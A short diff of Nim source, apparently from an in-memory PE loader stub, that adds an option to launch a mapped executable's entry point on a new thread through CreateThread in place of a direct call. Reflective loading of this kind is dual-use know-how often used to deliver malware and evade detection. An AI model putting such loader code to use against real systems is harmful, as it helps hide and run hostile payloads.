@@ -300,10 +300,13 @@ let PELoadStub * = """
           discard applyReloc(cast[ULONGLONG](preferAddr), cast[ULONGLONG](preferAddr), preferAddr,ntHeader.OptionalHeader.SizeOfImage)
         var retAddr: HANDLE = cast[HANDLE](preferAddr) + cast[HANDLE](ntHeader.OptionalHeader.AddressOfEntryPoint)
 
-
-    
-        let f = cast[proc(){.nimcall.}](retAddr)
-        f()
+        when defined(LocalCreateThread):
+            var threadId: LPDWORD = nil
+            var hThread: HANDLE = CreateThread(cast[LPSECURITY_ATTRIBUTES](nil),0,cast[LPTHREAD_START_ROUTINE](retAddr),nil,0,threadId)
+            WaitForSingleObject(hThread, 5000)
+        else:
+            let f = cast[proc(){.nimcall.}](retAddr)
+            f()
 
     #[
         var 
